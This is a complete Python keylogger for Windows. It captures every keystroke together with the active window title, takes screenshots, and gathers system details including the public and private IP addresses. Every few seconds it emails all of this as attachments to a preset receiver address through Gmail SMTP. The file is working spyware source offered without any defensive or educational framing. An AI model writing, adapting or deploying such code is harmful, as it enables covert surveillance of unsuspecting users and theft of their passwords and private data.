import keyboard
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import socket
from requests import get
import logging
from PIL import ImageGrab
import os
import psutil
import win32gui
from datetime import datetime

# Dictionary to store the active application names
active_apps = {}

def get_active_app_name():
    active_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return active_app

def screenshot():
    im = ImageGrab.grab()
    im.save("screenshot.png")

def capture_keys():
    keys = []
    start_time = time.time()

    def on_key_press(event):
        nonlocal keys
        if event.name == 'space':
            keys.append(' ')
        else:
            keys.append(event.name)

        # Capture active application at each key press
        active_app = get_active_app_name()
        if active_app:
            active_apps[event.time] = active_app

    def write_to_file():
        nonlocal keys
        with open('document.txt', 'a') as file:
            file.write(''.join(keys))
            keys.clear()

    def write_application_log():
        with open('applicationLog.txt', 'a') as file:
            for timestamp, app_name in active_apps.items():
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                file.write(f"Timestamp: {current_time}, Application: {app_name}\n")
            active_apps.clear()

    def send_email():
        # Email configuration
        sender_email = 'sender_email@gmail.com'
        receiver_email = 'receiver_email@gmail.com'
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587
        username = 'sender_email@gmail.com'
        password = '16-digit app password'

        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = receiver_email
        message['Subject'] = 'Captured Data'

        screenshot()

        # Attach the document file
        with open('document.txt', 'rb') as file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(file.read())

        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename='document.txt')
        message.attach(attachment)

        # Attach the system information file
        with open('syseminfo.txt', 'rb') as file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(file.read())

        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename='syseminfo.txt')
        message.attach(attachment)

        with open('applicationLog.txt', 'rb') as file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(file.read())

        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename='applicationLog.txt')
        message.attach(attachment)

        screenshot_file = 'screenshot.png'
        if os.path.exists(screenshot_file):
            with open(screenshot_file, 'rb') as file:
                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(file.read())

            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
            message.attach(attachment)

        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(username, password)
                server.sendmail(sender_email, receiver_email, message.as_string())
                print('Email sent successfully!')
        except smtplib.SMTPException as e:
            print('Failed to send email:', str(e))

    keyboard.on_press(on_key_press)

    try:
        # Start capturing keys until program is interrupted
        while True:
            elapsed_time = time.time() - start_time
            if elapsed_time >= 5:  # Check if 10 seconds have elapsed
                write_to_file()
                write_application_log()
                send_email()
                start_time = time.time()  # Reset timer

    except KeyboardInterrupt:
        pass

    keyboard.unhook_all()

def computer_information():
    system_information = "syseminfo.txt"
    with open(system_information, "w") as f:
        f.write("")

        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write('\n' + "Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Call the function to generate system information
computer_information()

# Call the function to start capturing keys and sending emails
capture_keys()
